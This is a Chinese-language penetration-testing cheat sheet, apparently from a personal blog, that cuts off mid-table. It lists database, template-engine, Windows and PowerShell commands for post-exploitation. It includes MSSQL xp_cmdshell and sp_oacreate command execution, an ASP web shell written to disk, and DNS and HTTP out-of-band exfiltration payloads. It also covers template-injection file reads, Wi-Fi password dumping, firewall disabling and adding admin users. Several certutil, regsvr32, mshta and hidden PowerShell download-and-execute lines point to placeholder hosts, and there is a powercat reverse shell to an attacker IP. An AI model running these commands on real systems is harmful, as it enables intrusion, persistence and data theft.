<h1 id="数据库命令"><a href="#数据库命令" class="headerlink" title="数据库命令"></a>数据库命令</h1><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><table>
<thead>
<tr>
<th>作用</th>
<th>参数</th>
<th>示例</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>打印字符串</td>
<td>echo ‘内容’</td>
<td></td>
<td></td>
</tr>
<tr>
<td>切换数据库</td>
<td>select 索引</td>
<td></td>
<td></td>
</tr>
<tr>
<td>显示服务器信息</td>
<td>info</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测服务是否运行</td>
<td>ping</td>
<td></td>
<td></td>
</tr>
<tr>
<td>关闭连接</td>
<td>quit</td>
<td></td>
<td></td>
</tr>
<tr>
<td>检测密码是否正确</td>
<td>auth</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置写入目录的路径</td>
<td>config set dir 目录</td>
<td></td>
<td></td>
</tr>
<tr>
<td>设置写入的文件夹</td>
<td>config set dbfilename</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>set 变量 值</td>
<td></td>
<td></td>
</tr>
<tr>
<td>保存</td>
<td>save</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>也称作Microsoft SQL Server</p>
<table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查询用户Hash</td>
<td>select name,sys.fn_varbintohexstr(password_hash) from sys.sql_logins</td>
<td></td>
</tr>
<tr>
<td>查询认证方式</td>
<td>select SERVERPROPERTY(‘IsIntegratedSecurityOnly’)</td>
<td></td>
</tr>
<tr>
<td>查询目录信息</td>
<td>execute master..xp_dirtree ‘e:&#39;,1,1</td>
<td>列出e盘的目录和文件信息<br>第一个1表示子目录<br>第二个1表示子目录的文件<br></td>
</tr>
<tr>
<td>查询当前是否为管理员</td>
<td>select is_srvrolemember(‘sysadmin’)</td>
<td></td>
</tr>
<tr>
<td>查询文件内容</td>
<td>create table files(line varchar(1024))<br>bulk insert  files from ‘文件路径’<br>select * from files</td>
<td>先建表files<br>将文件内容读入表files<br>查询files表的所有字段</td>
</tr>
<tr>
<td>启用xp_cmdshell</td>
<td>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</td>
<td>调用CreateProcess失败时，表示被拦截</td>
</tr>
<tr>
<td>xp_cmdshell执行系统命令</td>
<td>exec master..xp_cmdshell ‘whoami’</td>
<td>调用CreateProcess失败时，表示被拦截</td>
</tr>
<tr>
<td>启用sp_oacreate</td>
<td><code>EXEC sp_configure &#39;show advanced options&#39;, 1;</code>   <br><code>RECONFIGURE WITH OVERRIDE; </code>  <br><code>EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;  </code> <br><code>RECONFIGURE WITH OVERRIDE;</code><br></td>
<td></td>
</tr>
<tr>
<td>sp_oacreate执行系统命令</td>
<td><code>declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt</code></td>
<td>命令无回显<br>wscript.shell对象</td>
</tr>
<tr>
<td>sp_oacreate执行系统命令</td>
<td><code>declare @o int</code><br/><code>exec sp_oacreate &#39;Shell.Application&#39;, @o out</code><br/><code>exec sp_oamethod @o, &#39;ShellExecute&#39;,null, &#39;cmd.exe&#39;,&#39;cmd /c whoami &gt;e:\test.txt&#39;,&#39;c:\windows\system32&#39;,&#39;&#39;,&#39;1&#39;;</code><br></td>
<td>命令无回显<br/>Shell.Application对象</td>
</tr>
<tr>
<td>sp_oacreate执行系统命令</td>
<td><code>declare @o int, @f int, @t int, @ret int</code><br/><code>exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out</code><br/><code>exec sp_oamethod @o, &#39;createtextfile&#39;, @f out, &#39;e:\web\tmp.asp&#39;, 1</code><br/><code>exec @ret = sp_oamethod @f, &#39;writeline&#39;, NULL,&#39;&lt;%execute(request(&quot;x&quot;))%&gt;&#39;</code></td>
<td>命令无回显<br>scripting.filesystemobject对象</td>
</tr>
<tr>
<td>判断文件是否存在</td>
<td>存储过程   <code>exec master.sys.xp_fileexist &#39;文件路径&#39;</code></td>
<td></td>
</tr>
<tr>
<td>客户端主机名称</td>
<td><code>select host_name()</code></td>
<td></td>
</tr>
<tr>
<td>查询用户名</td>
<td><code>SELECT user_name()</code></td>
<td></td>
</tr>
<tr>
<td>查询版本信息</td>
<td><code>select @@version</code></td>
<td></td>
</tr>
<tr>
<td>查询所有的库名</td>
<td>select * from sysdatabases;</td>
<td></td>
</tr>
<tr>
<td>服务端主机名称</td>
<td><code>selectch @@servername</code></td>
<td></td>
</tr>
<tr>
<td>查询数据总数</td>
<td>select a.name,b.rows from sysobjects as a inner join sysindexes as b on a.id &#x3D; b.id where (a.type&#x3D;’u’) and (b.indid in (0,1)) order by b.rows desc</td>
<td></td>
</tr>
<tr>
<td>查询当前数据库中所有表名</td>
<td>select * from sysobjects where xtype&#x3D;’U’;</td>
<td>xtype&#x3D;’U’表示所有用户表<br/>xtype&#x3D;’S’表示所有系统表</td>
</tr>
<tr>
<td>查询指定表中的所有字段名</td>
<td>select name from syscolumns where id&#x3D;Object_Id(‘表名’);</td>
<td></td>
</tr>
<tr>
<td>查询指定表中的所有字段名和字段类型</td>
<td>select sc.name,st.name from syscolumns sc,systypes st where sc.xtype&#x3D;st.xtype and sc.id in(select id from sysobjects where xtype&#x3D;’U’ and name&#x3D;’表名’);</td>
<td></td>
</tr>
<tr>
<td>服务端主机名称</td>
<td><code>select serverproperty(&#39;MachineName&#39;)</code></td>
<td></td>
</tr>
<tr>
<td>DNS外带执行结果（xp_dirtree存储过程）</td>
<td><code>DECLARE @host varchar();</code><br/>SELECT <code>@host=(MSSQL命令)+&#39;.DNS地址&#39;;</code><br/><code>EXEC(&#39;master..xp_dirtree&quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);</code></td>
<td>验证漏洞</td>
</tr>
<tr>
<td>DNS外带执行结果（xp_dirtree存储过程)</td>
<td><code>;declare @q varchar(99);set @q=’\\[DNS子域名].burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —</code></td>
<td>burp client ping检测<br>将会访问<code>DNS子域名.burpcollaborator.net</code></td>
</tr>
<tr>
<td>DNS外带执行结果（xp_dirtree存储过程）</td>
<td><code>;declare @q varchar(99);set @q=’\\[DNS子域名]’+(SELECT user_name())+’.burpcollab’+’orator.net\ogy’; exec master.dbo.xp_dirtree @q; —</code></td>
<td>burp client ping检测<br>获取用户名</td>
</tr>
</tbody></table>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>DNS外带执行结果</td>
<td><code>select load_file(&#39;\\\\MYSQL命令.DNS地址\\aaa&#39;)</code></td>
<td></td>
</tr>
<tr>
<td>查看load_file()可以读取的磁盘</td>
<td>show variables like ‘%secure%’</td>
<td>当secure_file_priv为空，就可以读取磁盘的目录<br/>当secure_file_priv为G:\，就可以读取G盘的文件<br/>当secure_file_priv为null，load_file()就不能加载文件</td>
</tr>
<tr>
<td>查询所有数据库</td>
<td>show databases;</td>
<td></td>
</tr>
<tr>
<td>查询所有表</td>
<td>show tables;</td>
<td></td>
</tr>
<tr>
<td>查询指定表所有列</td>
<td>show columns from 表名;</td>
<td></td>
</tr>
<tr>
<td>查询表内容</td>
<td>handler <code>表名</code> open as <code>a</code>;<br>handler <code>a</code> read next;</td>
<td></td>
</tr>
<tr>
<td>延迟指定秒数</td>
<td>select sleep(秒)</td>
<td></td>
</tr>
<tr>
<td>服务端主机名称</td>
<td>select @@hostname;</td>
<td></td>
</tr>
<tr>
<td>查询数据库版本</td>
<td>select @@version;</td>
<td></td>
</tr>
<tr>
<td>读取文件</td>
<td>load_file(‘绝对路径’)</td>
<td></td>
</tr>
<tr>
<td>客户端主机名称和端口</td>
<td>select * from information_schema.PROCESSLIST;</td>
<td></td>
</tr>
<tr>
<td>查询指定数据库中所有表名</td>
<td>select table_name from information_schema.tables where table_schema&#x3D;’库名’ and table_type&#x3D;’base table’;</td>
<td></td>
</tr>
<tr>
<td>查询指定库指定表中的所有字段名</td>
<td>select column_name from information_schema.columns where table_schema&#x3D;’库名’ and table_name&#x3D;’表名’;</td>
<td></td>
</tr>
<tr>
<td>查询指定库指定表中的所有字段名和字段类型</td>
<td>select column_name,data_type from information_schema.columns where table_schema&#x3D;’库名’ and table_name&#x3D;’表名’;</td>
<td></td>
</tr>
</tbody></table>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>DNS外带请求</td>
<td>SELECT UTL_INADDR.GET_HOST_ADDRESS( (SQL语句) ||’.DNS地址’);</td>
<td></td>
</tr>
<tr>
<td>UTL_HTTP外带请求</td>
<td>UTL_HTTP(“<a href="http://VPS地址:端口/">http://VPS地址:端口/</a>“ || (SQL语句))</td>
<td></td>
</tr>
<tr>
<td>判断是否存在UTL_HTTP</td>
<td>select count(*) from all_objects  where object_name&#x3D;”UTL_HTTP”</td>
<td></td>
</tr>
<tr>
<td>查询表空间名称，需要一定权限</td>
<td>select * from v$tablespace;</td>
<td>Oralce没有库名,只有表空间</td>
</tr>
<tr>
<td>查询当前数据库中所有表名</td>
<td>select * from user_tables;</td>
<td></td>
</tr>
<tr>
<td>查询指定表中的所有字段名和字段类型</td>
<td>select column_name, data_type from user_tab_columns where table_name &#x3D; ‘表名’;</td>
<td>表名要全大写</td>
</tr>
<tr>
<td>查询指定表中的所有字段名</td>
<td>select column_name from user_tab_columns where table_name &#x3D; ‘表名’;</td>
<td>表名的字母要全大写</td>
</tr>
</tbody></table>
<h2 id="OQL"><a href="#OQL" class="headerlink" title="OQL"></a>OQL</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查询包含有指定关键字的信息</td>
<td>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(“password”))</td>
<td>查询含有password的内容</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>运行jar文件</td>
<td>java -jar 文件路径</td>
<td>运行</td>
</tr>
<tr>
<td>运行jar文件<br>分配指定运行内存</td>
<td>java -jar -Xms500m -Xmx1g 文件路径</td>
<td>分配500m-1g运行内存</td>
</tr>
<tr>
<td>以bat方式运行jar文件<br>不显示命令行界面</td>
<td>start javaw -jar 文件路径</td>
<td></td>
</tr>
<tr>
<td>查询java运行环境版本</td>
<td>java -version</td>
<td></td>
</tr>
</tbody></table>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>启动php服务</td>
<td>php -S 地址:端口</td>
<td></td>
</tr>
<tr>
<td>下载composer</td>
<td>php -r “copy(‘<a target="_blank" rel="noopener" href="https://install.phpcomposer.com/installer">https://install.phpcomposer.com/installer</a>‘, ‘composer-setup.php’);”</td>
<td></td>
</tr>
<tr>
<td>安装composer</td>
<td>php composer-setup.php</td>
<td></td>
</tr>
<tr>
<td>删除安装文件</td>
<td>php -r “unlink(‘composer-setup.php’);”</td>
<td></td>
</tr>
<tr>
<td>调用composer.phar文件，可写入.bat文件中并添加至环境变量调用</td>
<td>php “%~dp0composer.phar” %*</td>
<td></td>
</tr>
</tbody></table>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查看版本</td>
<td>python –version</td>
<td></td>
</tr>
<tr>
<td>查看已安装的库</td>
<td>pip list</td>
<td>对于一些既安装了python2又安装了python3的主机<br>大多用pip2或pip3来区别</td>
</tr>
<tr>
<td>查看python库路径</td>
<td>os.path</td>
<td>需要先import os</td>
</tr>
<tr>
<td>在线安装指定第三方库</td>
<td>pip install 库名</td>
<td></td>
</tr>
<tr>
<td>根据requirement文件<br>安装第三方库</td>
<td>pip install -r 文件路径</td>
<td></td>
</tr>
<tr>
<td>离线安装第三方库</td>
<td>python setup.py install</td>
<td>需要到pypi中下载离线压缩包</td>
</tr>
<tr>
<td>离线安装第三方库</td>
<td>pip install xxx.whl</td>
<td>需要到pypi中下载whl文件</td>
</tr>
<tr>
<td>python2开启http服务</td>
<td>python -m SimpleHTTPServer 端口</td>
<td></td>
</tr>
<tr>
<td>python3开启http服务</td>
<td>python -m http.server 端口</td>
<td></td>
</tr>
</tbody></table>
<h2 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>安装FTP组件</td>
<td>dotnet tool install –global dotnet-serve</td>
<td></td>
</tr>
<tr>
<td>开启FTP服务</td>
<td>dotnet serve -p 端口</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h1><h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>计算</td>
<td>{7*7}</td>
<td>得到的结果为7乘7</td>
</tr>
<tr>
<td>查询smarty版本</td>
<td>{$smarty.version}</td>
<td></td>
</tr>
<tr>
<td>执行php代码</td>
<td>{phpinfo()}</td>
<td>执行phpinfo()</td>
</tr>
<tr>
<td>执行php代码（后续版本已废弃）</td>
<td>{php}phpinfo();{&#x2F;php}</td>
<td>执行phpinfo()</td>
</tr>
<tr>
<td>执行php代码</td>
<td>{if phpinfo()}{&#x2F;if}</td>
<td>执行phpinfo()</td>
</tr>
<tr>
<td>执行php代码，写入文件</td>
<td>{if file_put_contents(“绝对路径”,”文件内容”)}{&#x2F;if}</td>
<td></td>
</tr>
<tr>
<td>获取文件内容</td>
<td>{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}</td>
<td>获取&#x2F;etc&#x2F;passwd文件内容</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>获取cookie_secret</td>
<td><code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h1><p>更详细的内容可查看windows官方文档： </p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/windows-commands</a></p>
<p>ping命令回包TTL值（Time To Live，报文存活时长）为128时，目标多半为windows系统</p>
<p>linux系统TTL值较windows小，基本为100以内</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>控制面板</td>
<td>control</td>
<td></td>
</tr>
<tr>
<td>系统信息</td>
<td>msinfo32</td>
<td></td>
</tr>
<tr>
<td>系统配置</td>
<td>msconfig</td>
<td>可查自启动项</td>
</tr>
<tr>
<td>恶意软件删除工具</td>
<td>mrt</td>
<td></td>
</tr>
<tr>
<td>远程控制rdp</td>
<td>mstsc</td>
<td></td>
</tr>
<tr>
<td>近期修改文件</td>
<td>recent</td>
<td></td>
</tr>
<tr>
<td>注册表</td>
<td>regedit</td>
<td></td>
</tr>
<tr>
<td>打开事件查看器</td>
<td>eventvwr.msc</td>
<td></td>
</tr>
<tr>
<td>任务计划程序</td>
<td>taskschd.msc</td>
<td></td>
</tr>
</tbody></table>
<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>显示当前缓存的 Kerberos 票证列表</td>
<td>klist</td>
<td></td>
</tr>
<tr>
<td>查询域内用户列表</td>
<td>net user &#x2F;domain</td>
<td></td>
</tr>
<tr>
<td>查询域管用户</td>
<td>net group “domain admins” &#x2F;domain</td>
<td></td>
</tr>
<tr>
<td>查询域管用户组</td>
<td>net group “Enterpris admins” &#x2F;domain</td>
<td></td>
</tr>
<tr>
<td>判断主域</td>
<td>net time &#x2F;domain</td>
<td>拒绝访问时，存在域，不为域用户<br>成功执行时，存在域，且为域用户<br>找不到域时，不存在域</td>
</tr>
<tr>
<td>查看域的名称</td>
<td>net config workstation</td>
<td>若含有“工作站域”则是存在域环境<br>为WORKGROUP则无域环境</td>
</tr>
<tr>
<td>查看域的名称</td>
<td>nslookup -type&#x3D;srv _ldap._tcp</td>
<td></td>
</tr>
<tr>
<td>查看域内所有主机</td>
<td>net view &#x2F;domain:HACHE</td>
<td></td>
</tr>
<tr>
<td>获取域密码信息</td>
<td>net accounts &#x2F;domain</td>
<td></td>
</tr>
<tr>
<td>查看域控机器名</td>
<td>nltest &#x2F;DCLIST:hacke</td>
<td></td>
</tr>
<tr>
<td>获取域信任信息</td>
<td>nltest &#x2F;domain_trusts</td>
<td></td>
</tr>
</tbody></table>
<h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>弹出计算器</td>
<td>calc</td>
<td></td>
</tr>
<tr>
<td>查看ARP高速缓存</td>
<td>arp -a</td>
<td></td>
</tr>
<tr>
<td>输出文件内容</td>
<td>type 文件名</td>
<td></td>
</tr>
<tr>
<td>文件合并</td>
<td>copy 文件1&#x2F;b + 文件2&#x2F;a 文件3</td>
<td>&#x2F;b表示文件1为二进制文件<br>&#x2F;a表示文件2为ascii码文件</td>
</tr>
<tr>
<td>文件合并（windows11）</td>
<td>copy<br>文件1路径<br>文件2路径<br>合并后的文件路径</td>
<td></td>
</tr>
<tr>
<td>查看路由表</td>
<td>route print</td>
<td></td>
</tr>
<tr>
<td>切换编码</td>
<td>chcp 数字</td>
<td>utf-8编码为65001</td>
</tr>
<tr>
<td>创建文件夹</td>
<td>md 文件夹</td>
<td></td>
</tr>
<tr>
<td>弹出聊天信息</td>
<td>msg 用户名 “内容”</td>
<td></td>
</tr>
<tr>
<td>向局域网内其他用户弹出聊天信息</td>
<td>msg &#x2F;server 地址 * “内容”</td>
<td></td>
</tr>
<tr>
<td>查看DNS信息</td>
<td>nslookup 目标</td>
<td>若出现了多个IP<br>大概率使用了CDN（内容分发网络）</td>
</tr>
<tr>
<td>查看端口外联状态</td>
<td>netstat</td>
<td></td>
</tr>
<tr>
<td><strong>查看端口列表</strong></td>
<td>netstat -ano</td>
<td></td>
</tr>
<tr>
<td>查看端口对应程序</td>
<td>netstat -anb</td>
<td></td>
</tr>
<tr>
<td><strong>显示wifi配置名信息</strong></td>
<td>netsh wlan show profiles</td>
<td></td>
</tr>
<tr>
<td><strong>显示wifi密码等配置信息</strong></td>
<td>netsh wlan show profiles wifi名称 key&#x3D;clear</td>
<td></td>
</tr>
<tr>
<td>查看简要ip&#x2F;mac&#x2F;网卡信息</td>
<td>ipconfig</td>
<td></td>
</tr>
<tr>
<td>查看全部ip&#x2F;mac&#x2F;网卡信息</td>
<td>ipconfig -all</td>
<td></td>
</tr>
<tr>
<td>检测连接状态</td>
<td>ping 目标</td>
<td>可使用-n设置发包个数，每个包间隔1秒，可通过ping本机地址并添加-n参数分辨windows系统</td>
</tr>
<tr>
<td>重命名文件</td>
<td>ren 文件名 新文件名</td>
<td></td>
</tr>
<tr>
<td>查看文件hash哈希值</td>
<td>certutil -hashfile 文件名</td>
<td></td>
</tr>
<tr>
<td>删除文件夹</td>
<td>rd 文件夹</td>
<td></td>
</tr>
<tr>
<td>关机</td>
<td>shutdown -s -t 180 -c “系统关机中”</td>
<td>-t设置延迟时长</td>
</tr>
<tr>
<td>访问网页</td>
<td>start <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></td>
<td>调用浏览器访问百度</td>
</tr>
<tr>
<td>远程访问</td>
<td>telnet 目标 端口</td>
<td>如果端口未开放则会提示失败<br>端口开放则会进入新的命令行界面</td>
</tr>
<tr>
<td>查看进程信息</td>
<td>tasklist</td>
<td></td>
</tr>
<tr>
<td>查看DLL调用情况</td>
<td>tasklist &#x2F;m</td>
<td></td>
</tr>
<tr>
<td>查看进程提供的服务</td>
<td>tasklist &#x2F;svc</td>
<td></td>
</tr>
<tr>
<td>列出树形文件夹结构</td>
<td>tree</td>
<td></td>
</tr>
<tr>
<td>查看本地开启的共享</td>
<td>net share</td>
<td></td>
</tr>
<tr>
<td>开启ipc$共享</td>
<td>net share ipc$</td>
<td></td>
</tr>
<tr>
<td>删除ipc$共享</td>
<td>net share ipc$ &#x2F;del</td>
<td></td>
</tr>
<tr>
<td>删除c:共享</td>
<td>net share c$ &#x2F;del</td>
<td></td>
</tr>
<tr>
<td>开启服务</td>
<td>net start 服务名</td>
<td></td>
</tr>
<tr>
<td>关闭服务</td>
<td>net stop 服务名</td>
<td></td>
</tr>
<tr>
<td>关闭防火墙(windows server 2003以前版本)</td>
<td>netsh firewag</td>
<td></td>
</tr>
<tr>
<td>关闭防火墙(windows server 2003以后版本)</td>
<td>netsh advfirewall set allprofiles state off</td>
<td></td>
</tr>
<tr>
<td>查看防护墙配置</td>
<td>netsh firewall show config</td>
<td></td>
</tr>
<tr>
<td>查看防火墙配置</td>
<td>netsh advfirewall firewall show rule name&#x3D;all</td>
<td></td>
</tr>
<tr>
<td>远程下载</td>
<td>bitsadmin &#x2F;transfer n 远程文件URL 保存路径</td>
<td></td>
</tr>
<tr>
<td>根据pid进程号关闭进程</td>
<td>taskkill &#x2F;pid 进程号 &#x2F;T</td>
<td></td>
</tr>
<tr>
<td>结束进程</td>
<td>taskkill &#x2F;im 进程名称 &#x2F;f</td>
<td></td>
</tr>
<tr>
<td>清空cmd界面信息</td>
<td>cls</td>
<td></td>
</tr>
<tr>
<td>查看当前目录下的文件信息</td>
<td>dir</td>
<td></td>
</tr>
<tr>
<td>查看当前目录下的所有文件信息</td>
<td>dir &#x2F;AH</td>
<td></td>
</tr>
<tr>
<td>打开当前进程下的文件夹</td>
<td>explorer %cd%</td>
<td></td>
</tr>
<tr>
<td>查看系统补丁信息</td>
<td>systeminfo</td>
<td></td>
</tr>
<tr>
<td>查看当前终端历史命令</td>
<td>doskey &#x2F;history</td>
<td></td>
</tr>
<tr>
<td>查看主机开机时间</td>
<td>net statistics workstation</td>
<td></td>
</tr>
<tr>
<td>查看当前详细权限</td>
<td>whoami &#x2F;all</td>
<td></td>
</tr>
<tr>
<td>查看域内指定用户权限</td>
<td>net user 用户名 &#x2F;domain</td>
<td></td>
</tr>
<tr>
<td><strong>查看用户列表</strong></td>
<td>net user</td>
<td></td>
</tr>
<tr>
<td>查看本机共享列表及域共享列表</td>
<td>net share</td>
<td></td>
</tr>
<tr>
<td>查看连接会话</td>
<td>net session</td>
<td></td>
</tr>
<tr>
<td><strong>查看在线用户</strong></td>
<td>query user</td>
<td>缩写quser</td>
</tr>
<tr>
<td><strong>查看本地管理员信息</strong></td>
<td>net localgroup administrators</td>
<td></td>
</tr>
<tr>
<td><strong>查看当前权限</strong></td>
<td>whoami</td>
<td>非域用户:<br>主机名\用户名<br><br/>域内用户：<br/>域名\用户名</td>
</tr>
<tr>
<td><strong>net远程连接</strong></td>
<td><code>net use \\IP地址 密码 /u:用户名</code></td>
<td></td>
</tr>
<tr>
<td><strong>远程下载</strong></td>
<td>certutil.exe -urlcache -split -f “远程文件URL” 保存路径</td>
<td>若要在下载后执行文件可使用&amp;&amp;文件名.exe</td>
</tr>
<tr>
<td><strong>远程下载</strong></td>
<td>bitsadmin &#x2F;transfer n 远程文件URL 保存路径</td>
<td></td>
</tr>
<tr>
<td><strong>远程下载</strong></td>
<td>regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:<a target="_blank" rel="noopener" href="http://x.x.x.x/r">http://x.x.x.x/r</a> scrobj.dll</td>
<td></td>
</tr>
<tr>
<td><strong>远程下载</strong></td>
<td>mshta <a target="_blank" rel="noopener" href="http://x.x.x.x/test.hta">http://x.x.x.x/test.hta</a></td>
<td></td>
</tr>
<tr>
<td>添加用户</td>
<td>net user 用户名 密码 &#x2F;add</td>
<td></td>
</tr>
<tr>
<td>查询计划任务</td>
<td>schtasks</td>
<td></td>
</tr>
<tr>
<td>查询计划任务详情</td>
<td>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</td>
<td></td>
</tr>
<tr>
<td>设置文件属性为隐藏</td>
<td>attrib +H 文件名</td>
<td></td>
</tr>
<tr>
<td><strong>ICMP协议探测指定C段存活主机</strong></td>
<td>for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL”</td>
<td></td>
</tr>
<tr>
<td>根据任务名查看计划任务详情</td>
<td>schtasks &#x2F;query &#x2F;v &#x2F;tn “任务名” &#x2F;fo list</td>
<td></td>
</tr>
<tr>
<td>将用户添加为管理员</td>
<td>net localgroup administrators 用户名 &#x2F;add</td>
<td></td>
</tr>
<tr>
<td>根据已知index.html文件名获取绝对路径信息，写入index.html.path.txt文件</td>
<td>cmd &#x2F;c “for &#x2F;f %i in (‘dir &#x2F;x &#x2F;s &#x2F;b index.html’) do (echo%i&gt;%i.path.txt)%26(ipconfig&gt;%i.ipconfig.txt)”</td>
<td></td>
</tr>
<tr>
<td>执行whoami命令，并将结果发送至dnslog</td>
<td>for &#x2F;f %i in (‘whoami’) do certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://x.x.x.x/%i">http://x.x.x.x/%i</a></td>
<td></td>
</tr>
<tr>
<td>查找yokan_test.js文件，并将该文件路径发送至dnslog</td>
<td>for &#x2F;r c:\ %i in (yokan_test.js*) do certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://x.x.x.x/%i">http://x.x.x.x/%i</a></td>
<td></td>
</tr>
<tr>
<td>certutil对文件进行base64解码，输出至另一文件中（后缀可变更）</td>
<td>certutil -decode 源文件路径 解码后的文件路径</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><strong>远程下载</strong></td>
<td>powershell -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://x.x.x.x/p">http://x.x.x.x/p</a>‘))”</td>
<td></td>
</tr>
<tr>
<td>列出计划任务</td>
<td>Get-ScheduledTask</td>
<td></td>
</tr>
<tr>
<td>根据文件夹列出计划任务</td>
<td>Get-ScheduledTask -TaskPath “文件夹”</td>
<td></td>
</tr>
<tr>
<td>查看powershell版本</td>
<td>get-host</td>
<td></td>
</tr>
<tr>
<td>查询父进程PID</td>
<td>get-wmiobject win32_process | select name,processid,parentprocessid,path</td>
<td></td>
</tr>
<tr>
<td>反弹shell</td>
<td>powershell IEX (New-Object System.Net.Webclient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a>‘); powercat -c 攻击机IP -p 地址 -e cmd&#96;</td>
<td></td>
</tr>
<tr>
<td>反弹shell</td>
